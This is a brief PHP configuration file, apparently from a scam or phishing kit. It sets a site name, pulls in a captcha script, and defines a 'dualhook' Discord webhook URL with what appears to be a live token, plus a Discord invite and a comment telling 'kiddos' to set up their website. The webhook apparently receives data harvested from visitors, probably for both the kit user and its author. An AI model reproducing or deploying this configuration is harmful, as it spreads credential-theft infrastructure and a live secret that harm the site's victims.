<?php
include("../../send/captcha.php");
$siteName = "Shockify pussy";
$webText = htmlspecialchars("");
$dualhook = "https://discord.com/api/webhooks/1508102665559609415/DYIrEhpZ63PuyTHxjdK7OZnOSWRaQ0qLs0RDcB9K8o99SZbb9VN9Jxc2nYuVNLL8kgH1";
$mainpfp = "Profile Picture";
$embedColor = "386acf";
$discord = "https://discord.gg/N44pjUyjkA";
?>

# setup your website here kiddos